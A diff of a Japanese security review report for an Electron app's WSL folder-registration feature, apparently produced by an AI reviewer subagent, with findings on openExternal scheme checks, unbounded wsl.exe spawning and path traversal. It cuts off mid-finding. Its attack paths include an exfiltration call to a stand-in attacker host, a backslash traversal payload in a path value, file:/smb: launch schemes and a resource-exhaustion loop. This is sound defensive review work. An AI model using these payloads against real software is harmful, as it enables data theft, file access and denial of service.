@@ -1,129 +1,229 @@
 # security-reviewer Review: フォルダ登録とランタイム検出 (R-1)
 
-**Run**: 2026-09-14 | **Round**: 4 (Track E) — **security 観点としては第 1 回**。viewpoint A / B は先行 3 round で未レビューのため全指摘を `new` として扱う
+**Run**: 2026-09-16
+**Reviewer**: security-reviewer
+**Spec**: specs/001-runtime-folder-registration-runtime-detection/spec.md
+**Round**: 1 (pr-gate)
+
+> **本ファイルの保存経緯**: 本 subagent に `Write` tool が渡されていないため、
+> reviewer の最終報告を pr-gate が保存したものである。
 
 ## 初回読了 viewpoint
 
-- A. 認可 / 認証 / secret: Critical:1 High:1 Medium:0 Low:1
-- B. 入力検証 / injection / 暗号: Critical:1 High:4 Medium:2 Low:0
-- C / D: 該当なし: `architecture-reviewer` の Owner (AD-023 のセキュリティ要件欠落は A に計上し重複計上しない)
-- E: 該当なし: `po-reviewer` / F: 該当なし: `convention-reviewer` / G: 該当なし (DB / OpenAPI 無し)
-- H: 該当なし: 検証経路の不備は各指摘の推奨アクションに内包
+**FR/SC (本 PR で実装・影響され、かつ A/B の owner 範囲に触るもの)**
+
+- FR-005 / FR-024: probe 出力とマウント情報の解釈 (`wsl-output.ts` / `wsl-detector.ts`)
+- FR-007 / FR-010 / FR-015: 停止中ディストロへの発行禁止・確認回数の境界強制・UNC 列挙 (`verified-running.ts` / `wsl-fs.ts` / `folder-service.ts`)
+- FR-016 / FR-019: 重複判定キーと永続化レコードの復元検証 (`folder.ts` / `folder-record.ts` / `folder-store.ts`)
+- FR-021 / FR-025 / FR-026: 3 名前空間の分離とパス API 独占 (`path-types.ts` / `path-api.ts` / `path-mapping.ts`)
+- FR-037 (f) / FR-041: ディストロ内スクリプトの内容検査・プロセス起動の許可リスト (`probe-script.ts` / `wsl-cli.ts` / `scripts/constitution/*`)
+- FR-038 / FR-039: `electron` import 限定・単一 capability・送信元検証 (`preload/index.ts` / `ipc.ts` / `validate.ts` / `origins.ts`)
+- FR-040: カスタムプロトコル配信・ハンドラ封じ込め・CSP directive・`window.open` と外部遷移の拒否 (`protocol.ts` / `window.ts`)
+- SC-001 / SC-005 / SC-013 / SC-016 / SC-018: 変換不能ケース / 起動発行 0 件 / 復元 / CSP・ナビゲーション / 検証表の各行
+
+**touched files に該当する charter / Confirmation**
+
+- `docs/domains/runtime/charter.md` — WSL 検出 KPI (SC-002)、パス API の業務ルール
+- `docs/domains/ui/charter.md:41-47` — 「配信プロトコル・CSP 基線・検証項目 10 は R-1 が `app` レイヤで固定した。超える指定は nonce/hash か ADR」→ `protocol.ts` / `check.mjs` 項目 10 が該当
+- AD-023 (accepted) — Electron セキュリティ要件 6 項目を全面採用、`setWindowOpenHandler` は scaffold 由来の checklist 項目として維持
+- AD-025 (accepted) §7 — 緩和は CSP 組み立て 1 関数の dev 分岐のみ、ゲートは `app.isPackaged`
+- AD-015 (accepted) §4 / §5 / §6 / §8 — UTF-8 要求、引数バックスラッシュ消失、マウントオプション正本、実地判定
+
+**viewpoint 網羅性**
+
+- A. 認可 / 認証 / RLS / secret: Critical:0 High:1 Medium:1 Low:1
+- B. 入力検証 / injection / XSS / CSRF / 暗号: Critical:0 High:1 Medium:3 Low:3
+- C. 業務不変条件 / Charter drift: 該当なし: `architecture-reviewer` の Owner
+- D. Constitution / ADR drift: 該当なし: `architecture-reviewer` の Owner (FR-040 / FR-010 との差分は A/B の各指摘の**根拠**として引用し、drift としては二重計上しない)
+- E. User Story / SC / AC / UX: 該当なし: `po-reviewer` の Owner
+- F. 命名 / module 配置 / lint hookup: 該当なし: `convention-reviewer` の Owner
+- G. DB / API / a11y / perf / OpenAPI / UX state: 該当なし: migration / `.sql` / OpenAPI が 0 件。a11y / ux は code-gate で実施済み
+- H. テスト / coverage / observability / regression: 該当なし: 検証経路の不備は A / B 各指摘の推奨アクションに内包した (design-gate round と同じ扱い。単独計上すると同一事象の二重計上になる)
 
 ## スコープ要約
 
-攻撃面は 3 つ — (1) renderer → main の IPC ペイロード、(2) 未信頼文字列 (ディストロ名 / renderer 供給パス / 永続化ファイル) から `wsl.exe` 引数と UNC パスへの経路、(3) カスタムプロトコル + CSP による renderer の閉じ込め。秘密情報は R-1 に存在せず、`workspace-store.md` が Principle V 適合を明示しており **R-1 が秘密を導入する経路は観察されなかった**。一方で (1)(2)(3) のいずれにも、仕様が明示していない検証に依存した経路が残っている。
+R-1 は実コードが揃った最初の PR であり、攻撃面は設計時と同じ 3 つ — (1) renderer → main の IPC、(2) 未信頼文字列 (ディストロ名 / renderer 供給パス / 永続化ファイル / `/proc/mounts`) から `wsl.exe` 引数と UNC パスへの経路、(3) カスタムプロトコル + CSP + ナビゲーション制御による renderer の閉じ込め。**design-gate で出した 10 件はすべて実装で解消されている** (下表)。特に (2) は `makeRuntimePath` / `isValidPathDTO` / `toUnc` の 3 重でバックスラッシュと `.`/`..` を落とし、`toUnc` が合成後に再正規化して share 配下への封じ込めを検証しており、設計時の C-001 は構造的に閉じた。秘密情報は repo 内に 0 件 (`sk_` / `AIza` / `ghp_` / private key / 生 credential すべて 0 件)、`electron-builder.yml:10` が `.env` を配布物から外し、`electron.vite.config.ts` に renderer bundle へ env を焼く `define` は無い。
+
+残った指摘は攻撃面 (3) と「境界での資源制約」に集中する。最も重いのは **`window.open` / 外部遷移を「拒否」と書いた FR-040 に対し、実装が任意 scheme を `shell.openExternal` で OS に転送している**点で、検証項目 11 が存在確認しか見ていないため機械検証は緑のまま通る。次に、FR-010 が「境界で強制する制約」と明記した同時実行の束ね (single-flight) が実装のどこにも無く、renderer 由来の IPC が `wsl.exe` のプロセス起動とセッション Map を無制限に増やせる。いずれも renderer 内のスクリプト実行を前提とするため、`reviewer-base.md` の禁則に従い **High 上限**とした (Critical は 0 件)。
+
+**重複抑制の遵守**: code-gate iteration 1 の MF-003 (`ipc.ts:122-127` の `event.sender.id` 束縛) / MF-004 (`index.html` 静的 CSP 撤去 → `protocol.ts:173` / `window.ts:76`) は解消済みとして扱い、再指摘していない。`window.ts` に対する本 round の指摘 (H-001) は同ファイルだが **origin が異なる** (MF-004 は CSP 宣言箇所の移設、H-001 は `openExternal` の scheme 検証欠落) ため新規として起票する。
+
+## design-gate 指摘 10 件の解消状況 (必須判定)
+
+| design ID | 内容 | 判定 | 根拠 (file:line) |
+|---|---|---|---|
+| C-001 | POSIX 値中のバックスラッシュが UNC 合成でセグメント境界になる | **解消** | `path-types.ts:113` が `\` を `forbidden-character` で拒否 / `:117` が `.`/`..` を拒否 / `validate.ts:72` が IPC 境界で同じ拒否 / `path-api.ts:150-154` が合成後に `win32.normalize` して share 配下を検証し `outside-share` を返す / `path-api.ts:48-57` `isValidSegment` が `/`・`\`・`.`・`..`・制御文字を拒否 / `folder-record.ts:130` が復元でも同じ生成関数を通す / spec SC-001 に「バックスラッシュを含む POSIX 値で変換不能」を追加済み。**残余は host 名前空間側のみ** → 新規 M-004 |
+| C-002 | AD-023 が必須とする送信元検証が FR にも検証表にも無い | **解消** | FR-039 に送信元検証・origin 集合の単一化・環境で無効化する分岐の禁止を明記 / `validate.ts:46-51` `isTrustedSender` (frame null 拒否・`frame.parent !== null` 拒否・`allowedOrigins()` 照合) / `ipc.ts:74-82` が**全チャンネル共通の前置き**として適用 / トークンの送信元束縛 `folder-service.ts:61,246,271-274` / 検証 `validate.test.ts:76-94`、`folder-service.test.ts:182-194` |
+| H-001 | `beginBrowse({kind:'windows'})` が検証不要とされ拒否手段も無い | **解消** | `validate.ts:125` が `kind === 'windows'` を `unsupported-location` で**常に拒否** / `folder-service.ts:238` に二重の拒否 / `BrowseError` に `unsupported-location` が追加 / FR-015 に「所在 `windows` に対してこの入口を開いてはならない」 / SC-018 に該当行 / `folder-service.test.ts:232-235` |
+| H-002 | プロトコルハンドラの配信範囲に要求が無い | **解消** | FR-040 に「正規化後も同梱 renderer 出力ディレクトリ配下に収まる要求だけを解決」を明記 / `protocol.ts:112-144` が 3 段 (`new URL` 正規化 → `decodeURIComponent` 後のセグメント検証 → `isValidHostSegment` が `:` を拒否) + `:140-141` の接頭辞再確認 / `protocol.test.ts` 存在 / SC-016 にハンドラ単体テストの計測経路 |
+| H-003 | CSP directive が規定されず `unsafe-inline`/`unsafe-eval` でも要件を満たす | **解消** | FR-040 が directive 集合を明記 / `protocol.ts:35-63` が `default-src 'none'` + `object-src`/`frame-ancestors`/`base-uri`/`form-action` を封じる / `unsafe-eval` は両環境で不在、`unsafe-inline` は dev 分岐のみ / ゲートは `origins.ts:27-29` `app.isPackaged` / `check.mjs:396-481` 項目 10 が (a) 必須 directive (b) 禁止形 (c) `unsafe-inline` の位置 (d) ゲート式 (e) **他ファイルに 2 つ目の宣言が無いこと**を検査 / `index.html:11-22` から meta CSP 撤去 (= MF-004) |
+| H-004 | 「3 不変条件は SH-014 項目 6 が検査する」が research と矛盾 (誤った安心) | **解消 (残余あり)** | `probe-script.ts:4` が「**ADR レビューが担保する。機械検証されない**」に訂正 / `check.mjs:325` の note も同じ / 項目 6 は 3 点検査に分解済み (`check.mjs:262-318`: (i) 単一リテラル (ii) 標準入力へ書く式が識別子そのもの — **全ファイル走査** (iii) 許可形) / `allowlists.mjs:222-229` の文言も一致。**(iii) の実装が行内部分一致である点が残余** → 新規 M-002 |
+| H-005 | `distroName` に文字種制約が無い | **解消** | `namespace.ts:35-45` `isValidDistroName` (長さ・先頭 `-`・`\`・`/`・`:`・NUL/C0/DEL/C1) / `wsl-detector.ts:104-107` が**列挙時点**で検証し不正名を `invalid-name-charset` として黙って落とさない / `:159` `verifyRunning` も再検証 / `wsl-cli.ts:57-63` `assertNoBackslash` が二重の網 / `validate.ts:87`・`folder-record.ts:55`・`path-types.ts:108,131` が全境界で同じ関数 / SC-002 に「文字種制約を満たさない名前は列挙不能として提示」 |
+| M-001 | `displayName` / `id` / `registeredAt` に検証規則が無い | **解消** | `folder-record.ts:77-90` が `isValidFolderId` / 長さ上限 / 制御文字 / `Number.isFinite` を検査 / `folder-store.ts:138-143` が `isUniqueId` で `id` 一意性を要求し `invalid-record` に計上 / `validate.ts:165-172` `isValidDisplayName` / 上限と述語は `domain/validation.ts` の 1 箇所 |
+| M-002 | 「読み取りのみ」が判定 4 と矛盾 | **解消** | `probe-script.ts:5-7` が「永続的な変更 (ファイル・パッケージ・OS 設定) を残さない。プロセス寿命で消える一時資源の生成 — user namespace の試験生成 — は許す」に書き換え / `allowlists.mjs:222-229` も同文 |
+| L-001 | `registerFolder` の `location` に実在性照合が無い | **解消** | `validate.ts:207-210` が `kind === 'wsl'` のとき検出済み descriptor との一致を要求し `unknown-location` を返す |
+
+**resolved: 10 / unresolved: 0**。うち 2 件 (C-001 / H-004) に別 origin の残余があり、新規指摘として再起票した (M-004 / M-002)。
 
 ## Findings
 
-### [Critical] POSIX 値中のバックスラッシュが UNC 合成時にセグメント境界となり、値が字面で示す位置とは別の位置に解決される (C-001)
+### [High] `shell.openExternal` に scheme の許可リストが無く、FR-040 の「拒否」が「OS への転送」になっている (H-001) (scope: feature)
 
-- **観察**: `ipc-capability.md` の `target` 検証は「`of` の名前空間識別子がトークンが表すディストロと一致すること … `name` にセパレータ・`.` / `..` を含まないこと」であり、**`of.value` の中身に対する検証行は存在しない**。data-model §1 は「`RuntimePath` は `.` / `..` を解決済みとする」と書くが、`WslUncPath` 側には `.` / `..` の不変条件が無く、課されているのは埋め込みディストロ名と識別子の一致 (= 接頭辞照合) だけ。`runtime-detection.md` の入口検証も**識別子の一致であって実効到達先の検証ではない**。
-- **攻撃経路**: `browseDirectory(token, { kind:'child', of:{ namespace:'wsl:Ubuntu', value:'/home/u/..\..\Debian' }, name:'home' })` を送る。POSIX 意味論ではバックスラッシュは通常文字であり `..` セグメントは存在しないため「`.` / `..` を解決済み」不変条件は**発火せずに満たされる**。UNC 変換後に Windows が `..` を正規化し、設計が定めた検証をすべて通過したまま意図しない位置へ到達する。
-  **利用者操作を伴わない亜種**: 細工した永続化ファイルに同形の値を置く。`isNamespaceConsistent` は所在とディストロ名の一致を見るだけ、`invalid-path` は「名前空間の形式に合致しない」だけで、この値は **POSIX 形式として完全に合致する** → 復元される → BE-047 の起動時到達可能性判定が同じ UNC 経路を踏む。
-- **同種事象探索**: `セパレータ|バックスラッシュ` で **17 件**。うち**未信頼文字列中のバックスラッシュを制約している行は 0 件**。同じ欠落が到達する入口は **3 つ** — `target.of` / `name`、`registerFolder` の `path` (「解決は所在の名前空間の意味論で行う」と明記されており同じく素通り)、workspace-store の `invalid-path`。
-- **リスク/影響**: renderer 供給値および永続化ファイル由来の値が、設計が明示した検証を**すべて満たしたまま**、値が字面で示す位置とは別の位置に解決される。パス型モデルの前提 (名前空間と値が信頼できる) が崩れる。
-- **推奨アクション**: (1) `WslUncPath` の不変条件に「値は `.` / `..` セグメントを含まない。**合成後に再正規化し、対象ディストロの share 配下に収まることを検証する**」を追加。(2) パス変換表に「POSIX 値の成分にバックスラッシュ (および NUL) が含まれる場合は UNC 変換を**変換不能**とする」を追加し SC-001 の性質テストにケースを足す。(3) `name` を「`/` とバックスラッシュの双方、NUL、制御文字を含まず、`.` / `..` **そのもの**でないこと、長さ上限あり」と具体化する (現行の「`.` を含まない」は文字どおり読むと `.git` / `Ubuntu-26.04` を弾き、実装時に必ず緩められる)。`of.value` にも同じ制約を新設。(4) `registerFolder` と workspace-store にも同じ規則を適用。(5) `infra/fs` 入口検証を「識別子一致」から「**正規化後の UNC 値が対象ディストロの share 配下に収まる**」に強化。
-- **根拠**: CWE-22 / CWE-41 / FR-015 / FR-021 / SC-005 / AD-015 §1
+- **観察**: `src/main/app/window.ts:47-50`
 
-### [Critical] AD-023 が必須とする「送信元の検証」が FR にも検証表にも存在しない (C-002)
+  ```ts
+  window.webContents.setWindowOpenHandler(({ url }) => {
+    void shell.openExternal(url)
+    return { action: 'deny' }
+  })
+  ```
 
-- **観察**: `ipc-capability.md` が AD-023 の原則 5「main 側で**送信元と**ペイロードをすべて未信頼として検証」を「検証節」へマップしている。しかし検証表 9 行は**すべてペイロード**であり、送信元に関する行が 1 行も無い。BE-009 は「送信元とペイロードをすべて未信頼として検証する (**検証表**)」とその表に委譲している。spec.md にも送信元検証を要求する FR が無い (FR-039 は `contextIsolation` / `sandbox` / `nodeIntegration` / 単一 capability のみ)。
-- **攻撃経路**: AD-023 は 6 つのセキュリティ要件を列挙し、本 bundle はうち 5 つを FR に落としている。送信元検証だけが FR に落ちていない。実装者は BE-009 に従い検証表を実装する → ペイロード検証のみが実装され `event.senderFrame` は一度も参照されない。`webPreferences` を共有する追加 window / `window.open` / 埋め込み frame が将来 1 つでも生まれた時点で、その frame からの呼び出しを main 側で区別できない。さらに `token` は発行元に束縛されないため、token を知る任意の frame が他 frame のブラウズセッション (= 実行中確認済みの値) を流用できる。これは data-model が「偽造だけでなく**正規の値の流用**も塞ぐ」と宣言した経路の IPC 層版の取りこぼしである。
-- **同種事象探索**: `送信元|senderFrame|sender|webContents|ipcMain|event.` で **2 件**。いずれも要求の**参照**であり、**検証内容を定義した箇所は 0 件**。
-- **リスク/影響**: accepted ADR が名指しで要求するセキュリティ要件が spec → contract → tasks のどこにも実体として落ちない。R-1 は「以降の全 feature が乗る DTO / 境界を固定する feature」であり、ここで欠けると X-1 以降の全 IPC がこの土台に乗る。
-- **推奨アクション**: (a) 検証表の先頭に「**送信元**」行を新設 —「`event.senderFrame` が登録済みカスタムプロトコル origin の main frame であること。不一致は応答せず破棄する」。(b) `token` の検証行に「発行した送信元と一致すること」を追加。(c) FR-039 に送信元検証の一文を追加し BE-009 の記述を明示要求に変える。(d) 計測経路 (preload をスタブせず main 側ハンドラを直接叩く単体テスト) を与える。
-- **根拠**: AD-023 / CWE-940 / OWASP Electron Security Checklist
-- **severity 注記**: 「現時点で実害のある観察事実」ではなく **accepted ADR が必須とする要件の欠落**として Critical に置いた。gate が「将来 frame が増えたとき」の仮定的経路と判定するなら High への降格を受け入れる
+  同ファイル `:53-66` の `will-navigate` も、許可 origin 外のすべてに対して `event.preventDefault()` の直後に `void shell.openExternal(url)` を呼ぶ。**どちらにも scheme の検査が無い**。FR-040 は「**`window.open` と外部 URL へのトップレベル遷移を拒否しなければならない**」と書いており、SC-016 の計測経路は「ナビゲーション拒否は**検証スクリプトの項目**」である。その項目 (`scripts/constitution/check.mjs:502-510`) は `setWindowOpenHandler(` と `.on('will-navigate'` の**呼び出しが存在すること**しか見ない。ハンドラの中身が `deny` かどうか、転送先 scheme を絞っているかは一切見ない。
+- **同種事象探索**: `openExternal|setPermissionRequestHandler|setPermissionCheckHandler` をリポジトリ全体で grep → `src/` 内 **2 件** (`window.ts:48` / `window.ts:64`、いずれも scheme 無検査)。scheme 許可リストを定義した箇所 **0 件** (`allowlists.mjs` にも `openExternal` の項目は 0 件)。`openExternal` / `will-navigate` / `setWindowOpenHandler` の**挙動**を検証するテスト **0 件** (`*.test.ts*` 全走査で該当 0。`validate.test.ts` が検証しているのは `isTrustedSender` のみ)。
+- **リスク/影響**: `shell.openExternal` は Windows では `ShellExecute` 相当であり、渡された scheme を OS のハンドラに解決させる。`file:///C:/...exe` / `smb://host/share/x.exe` / 任意の登録済みカスタムプロトコルを渡せば、**`sandbox: true` の renderer から sandbox の外でプログラムを起動できる** (CWE-749 / Electron セキュリティチェックリスト「Do not use `shell.openExternal` with untrusted content」)。加えて `connect-src 'none'` で閉じたはずの外部通信経路が `openExternal('https://attacker/?d=...')` で復活し、**CSP による exfiltration 封鎖を素通りする**。現時点で renderer にスクリプト実行を取る経路は観察されていない (packaged CSP は `script-src 'self'`、React のエスケープが効いており、`markdown-text.tsx:150` の `a` は react-markdown の既定 URL 変換が `file:` を落とす、`ChatScreen.tsx:34` の messages は空配列) ため、**cascade 上の実害成立には renderer 側の別の破れを 1 つ要する**。よって `reviewer-base.md` §禁則に従い Critical にはしない。ただし構図は design-gate H-003 と同型である — **要求を満たしたまま防御効果を 0 にでき、機械検証が緑を返し続ける**。R-1 は「以降の全 feature が乗る土台」であり、R-3 が transcript (モデル出力・外部由来テキスト) を描画するとリンクは直ちに攻撃者制御下に入る。
+- **推奨アクション**:
+  1. `origins.ts` に `EXTERNAL_URL_SCHEMES = ['https:', 'http:']` を新設し (集約先を origin 定数と同じファイルに置く)、`window.ts:47-50` / `:64` の両方で `new URL(url).protocol` が集合に含まれるときだけ `openExternal` を呼ぶ。含まれない場合は**何もしない** (`action: 'deny'` / `preventDefault()` のみ)。URL の parse 失敗は拒否 (`:57-61` と同じ扱い)。
+  2. `check.mjs` 項目 11 を存在確認から**内容検査**へ広げる — (a) `setWindowOpenHandler` のコールバックが `action: 'deny'` を返すこと、(b) `openExternal` の呼び出しが scheme 許可リスト定数の参照と同一行/同一ブロックにあること、(c) 許可リスト定数の定義が 1 箇所であること (`allowedOrigins` と同じ扱い)。
+  3. `window.ts` にハンドラ単体テストを追加し、`file:` / `smb:` / 未知 scheme が `openExternal` に到達しないことを固定する。SC-016 の「ナビゲーション拒否」を検証スクリプト項目だけに委ねない。
+- **根拠**: FR-040 (最終段)、SC-016、AD-023 「`setWindowOpenHandler` は assistant-ui の Electron セキュリティチェックリストの 1 項目」/ 「セキュリティ要件は全面的に採用する」、CWE-749 / CWE-939、OWASP / Electron Security Checklist #14
+- **scope 根拠**: `window.ts` / `check.mjs` はいずれも本 PR の touched files (`touched_files` に `src/main/app/window.ts` / `scripts/constitution/check.mjs` あり)。修正は feature 内で完結する
 
-### [High] `beginBrowse({ kind:'windows' })` が検証不要とされ、拒否する手段も定義されていない (H-001)
+### [High] renderer 由来の IPC が `wsl.exe` のプロセス起動とセッション Map を無制限に増やせる (single-flight が実装されていない) (H-002) (scope: feature)
 
-- **観察**: 検証表は「`location` (`beginBrowse`) … `kind === 'windows'` は**不要**」。`BrowseError` に**所在が非対応であることを返す値が無い**。契約は windows が `pickHostFolder` を使うことは書くが、`beginBrowse` が windows を**拒否する**とは書いていない。
-- **攻撃経路**: renderer が `beginBrowse({ kind:'windows' })` を呼ぶ → 検証表が「不要」と言っているため実装は検証せず token を発行する (拒否のための error 値も無いので素直に書くと成功経路になる) → `browseDirectory(token, { kind:'child', of:{ namespace:'host', value:'C:' }, name:'Users' })` → `target` の検証は「トークンが表す**ディストロ**と一致すること」であり、windows トークンにディストロは存在せずこの規則は空回りする → **ネイティブダイアログ (= 利用者の明示同意) を経ずにホストファイルシステムを任意に列挙できる**。`pickHostFolder` を host 側の唯一の入口に据えた設計意図が無効化される。
-- **同種事象探索**: `beginBrowse|browseDirectory` は contracts に **10 件**、spec / plan / tasks / data-model / research / quickstart に **0 件** (ブラウズセッション API は契約にしか存在せず対応 FR も無い)。windows 所在の扱いを定義した行は **0 件**。
-- **推奨アクション**: `BrowseError` に `unsupported-location` を追加し、検証表の該当行を「`kind === 'windows'` は**常に拒否する** (host 所在の入口は `pickHostFolder` のみ)」に書き換える。BE-046 に反映し、FR-015 の近傍にブラウズセッション API の FR を 1 本立てる (現状 FR が無いため tasks 側の記述だけが正本になっている)。
-- **根拠**: CWE-862 / FR-013 / FR-038
+- **観察**: FR-010 は「**これは境界で強制する制約であり、UI の作り方に委ねてはならない — 再検出・判定・ブラウズ開始は同時実行を 1 本に束ね、追加要求は既存結果へ合流させる**」と明記している。実装にその束ねが**どこにも無い**。
+  - `src/main/app/ipc.ts:89` `refreshRuntimes` → `composition-root.ts:76-85` → `runtime-store.ts:124-130` `detect()` は無条件に `detector.list()` を呼び、`wsl-detector.ts:72-76` が `listNames` / `listRunning` / `listVerbose` を**毎回 3 プロセス**起動する。さらに同経路が `probeAll()` を投げ、`:143` の `verifyRunning` 1 回 + ディストロごとの `probe` (`:162`) が加わる。
+  - `ipc.ts:91-101` `probeRuntime` → `runtime-store.ts:195,207` が**毎回** `verifyRunning` + `probe` を起動する (「毎回実行状態を取り直す」が設計意図なのでキャッシュは使えない)。
+  - `folder-service.ts:241` `beginBrowse` は `detector.verifyRunning([namespace])` を**毎回**呼ぶ (`wsl-detector.ts:152` → `cli.listRunning()` → 1 プロセス)。`ensureVerified()` (`:120-124`) の TTL キャッシュは `beginBrowse` 経路には掛かっていない。
+  - `folder-service.ts:98,246` `sessions: Map<string, BrowseSession>` は `beginBrowse` ごとに `set` されるだけで、**件数上限も期限切れの定期回収も無い**。削除は `browseDirectory` が同じトークンで叩かれたときだけ (`:287`/`:309`)。
+- **同種事象探索**: `inflight|inFlight|single-flight|singleFlight|coalesc|dedupe` をリポジトリ全体で grep → `src/` 内 **0 件** (ヒットは `pnpm-lock.yaml` と `.claude/skills` の無関係な文字列のみ)。プロセス起動箇所は `wsl-cli.ts:84` の **1 件**で、そこへ到達する renderer 制御の IPC チャンネルは **4 件** (`refreshRuntimes` / `probeRuntime` / `beginBrowse` / `listFolders` (TTL 経由))。呼び出し回数を制限する行 (rate limit / 同時実行上限 / in-flight 共有) **0 件**。`sessions` の上限・掃除 **0 件**。
+- **リスク/影響**: 送信元検証を通った renderer が `for(;;) closta.refreshRuntimes()` を回すと、1 反復あたり最低 3 プロセス (判定を含めれば 4+N) の `wsl.exe` が起動し、各プロセスは最長 10〜20 秒生存する (`wsl-cli.ts:28,31`)。同時実行の上限が無いためプロセステーブルとメモリを食い潰し、**ホスト側のサービス停止に至る** (CWE-770 Allocation of Resources Without Limits)。`sessions` も同時に単調増加する (CWE-401 相当のメモリ枯渇)。これも renderer 内のスクリプト実行を前提とするため **High 上限**とするが、(a) 検証を通った正規の送信元からの要求であり追加の破れを要さない点、(b) FR-010 が「境界で強制する」と名指した制約が**実装に 1 行も無い**点で、H-001 より観察事実として明確である。副次的に、SC-004 の 300 ms / 4 秒予算も並行要求下では成立しない。
+- **推奨アクション**:
+  1. `runtime-store.ts` に in-flight promise を 1 本持たせ、`detect()` / `probeAll()` / `probeOne(id)` (id ごと) を single-flight にする。進行中の要求には同じ promise を返す (FR-010 の「追加要求は既存結果へ合流させる」の字義)。
+  2. `folder-service.ts` の `beginBrowse` を名前空間ごとの in-flight で束ね、`ensureVerified()` の TTL キャッシュと確認経路を共有する。
+  3. `sessions` に上限 (例: 送信元ごと 8 件、超過時は最古を破棄) と、`now()` 基準の期限切れ掃除を入れる。`BROWSE_SESSION_TTL_MS` は既にあるので判定材料は揃っている。
+  4. `pickHostFolder` も同様に同時に 1 つだけ開くようにする (現状は呼ぶたびにネイティブダイアログを積める)。
+  5. SC-018 の検証表テストに「同一チャンネルへの連続要求がプロセス起動を比例させないこと」を 1 ケース足す (`wsl-cli` はインタフェースなので spawn 回数を数えられる)。
+- **根拠**: FR-010 (「境界で強制する制約」)、SC-004、CWE-770 / CWE-400、OWASP API4:2023 (Unrestricted Resource Consumption)
+- **scope 根拠**: `runtime-store.ts` / `folder-service.ts` / `ipc.ts` はいずれも本 PR の touched files。FR-010 は本 spec の要求であり別 spec に送る余地が無い
 
-### [High] カスタムプロトコルのハンドラが配信範囲を同梱アセットに限定する要求を持たない (H-002)
+### [Medium] `session` の permission ハンドラが未設定で、Electron の既定 (許可) のままになっている (M-001) (scope: feature)
 
-- **観察**: FR-040「`file://` ではなく**アプリ内で登録したカスタムプロトコルで配信**し、**CSP を絞らなければならない**」。R-13 も BE-011 も同様。SC-016 の計測は「`file://` 以外のプロトコルで配信され CSP が設定されている」+「関連付け API の呼び出しが 0 件」。**ハンドラが解決してよいファイルの範囲に関する記述は bundle 全体で 0 件**。
-- **攻撃経路**: BE-011 を素直に実装する (要求 URL のパス部分をアセット root に結合して読むハンドラ) → renderer 内の任意の `fetch` / `img` / `script` / import が親ディレクトリ参照を含む URL、あるいは `%2e%2e%2f` で符号化した等価形を要求する → 正規化と封じ込めが無ければアプリ権限で任意ファイルを読み、内容が**最も信頼度の低いプロセスである renderer** に入る → `file://` を捨てた目的が打ち消されるが、SC-016 は「`file:` でないこと」しか見ないため gate は緑になる。
-- **同種事象探索**: `CSP|Content-Security|script-src|unsafe|カスタムプロトコル|protocol` で **10 件**。**ハンドラの解決範囲に言及した行は 0 件**。
-- **推奨アクション**: FR-040 に「ハンドラは**正規化後も同梱 renderer 出力ディレクトリ配下に収まる要求だけ**を解決し、それ以外は拒否する」を追記。SC-016 に「traversal 要求が拒否されること」をハンドラ単体テストの計測経路として追加。BE-011 に明記。**これは実装技法ではなく「何を満たすか」であり、spec の「実装方式は tasks とコードで決める」の対象外**として扱う。
-- **根拠**: CWE-22 / AD-023
+- **観察**: `setPermissionRequestHandler` / `setPermissionCheckHandler` の呼び出しが `src/` に **0 件**。`window.ts:23-39` の `webPreferences` は `sandbox` / `contextIsolation` / `nodeIntegration` を明示しているが、`window.webContents.session` に対する permission 制御は無い (`:72` で `webRequest.onHeadersReceived` は使っている = session へのアクセス手段は既にある)。
+- **同種事象探索**: `setPermissionRequestHandler|setPermissionCheckHandler` → **0 件** (H-001 と同じ grep で確認)。
+- **リスク/影響**: Electron はハンドラ未設定時に権限要求を既定で許可する。renderer は `default-src 'none'` の CSP 下にあり外部コンテンツを読まないため現状の露出は小さいが、`display-capture` / `media` / `clipboard-read` が無条件に通る状態は AD-023 が「全面的に採用する」と宣言した assistant-ui / Electron セキュリティチェックリストの項目 (Handle session permission requests) が未実装であることを意味する。H-001 と同じく実害成立には renderer 側の破れを要するため Medium。
+- **推奨アクション**: `window.ts` (または `app` の起動経路) で `session.setPermissionRequestHandler((_wc, _perm, callback) => callback(false))` と `setPermissionCheckHandler(() => false)` を置く。R-1 は権限を 1 つも要しないので全拒否が正しい既定であり、必要になった feature が許可集合を 1 定数として追加する形にする (`allowedOrigins` と同じ集約方針)。`check.mjs` 項目 11 に存在確認を追加する。
+- **根拠**: AD-023 「同ガイドのセキュリティ要件は全面的に採用する」、FR-039、CWE-276 (Incorrect Default Permissions)、Electron Security Checklist #5
+- **scope 根拠**: `window.ts` は本 PR の touched files
 
-### [High] CSP の directive が規定されず、`unsafe-inline` / `unsafe-eval` を含む CSP でも FR-040 と SC-016 を満たす (H-003)
+### [Medium] 項目 6 (iii) の許可形検査が行内の部分一致であり、許可形を 1 語含む行に任意のコマンドを連ねられる (M-002) (scope: feature)
 
-- **観察**: 要求は「**CSP を絞らなければならない**」、計測は「**開発者ツールでの確認**」「**CSP が設定されている**」。directive を 1 つでも指定した行は bundle 内に **0 件**。
-- **攻撃経路**: SH-007 で assistant-ui の公式 CLI が design system を導入しインラインスタイルが必要になる → 実装者が `style-src` に `unsafe-inline` を足す。scaffold 既定の meta CSP をそのまま流用すると `script-src` 側にも同時に残る → quickstart V-6 の確認は「CSP が設定されている」なので**満たされる**。SC-016 も満たされる → R-1 は「以降の全 feature が乗る」feature であり、R-3 で transcript (= モデル出力・外部由来テキスト) を描画する土台がこの CSP になる。**後から締め直す契機が設計上どこにも無い**。本 feature 自身も、ディストロ名・フォルダ名という**外部由来の任意文字列を UI にそのまま描画する**ことを SC-011 で要求している。
-- **同種事象探索**: 上記 10 件中、directive を指定したもの **0 件**、`unsafe-inline` / `unsafe-eval` を禁止したもの **0 件**、CSP を機械検証の対象にしたもの **0 件** (SH-014 の検証 9 項目にも CSP の項目は無い)。
-- **リスク/影響**: 「CSP を絞る」という要求が、満たしたまま防御効果ゼロにできる。**検証を満たしつつ有害な効果が残る**典型。
-- **推奨アクション**: FR-040 に最小 directive を明記する (`default-src` を `none` に置き、`script-src` / `style-src` / `img-src` を自己オリジンに限り、`connect-src` / `object-src` / `frame-ancestors` / `base-uri` を封じる)。`unsafe-inline` / `unsafe-eval` を SH-014 の検証項目に禁止語として載せ、SC-016 前段の計測経路を開発者ツール目視から検証スクリプトへ移す (後段が既に項目 9 で機械化されているのと同じ扱いに揃える)。
-- **根拠**: CWE-1021 / OWASP CSP / AD-023
+- **観察**: `scripts/constitution/check.mjs:312-318`
 
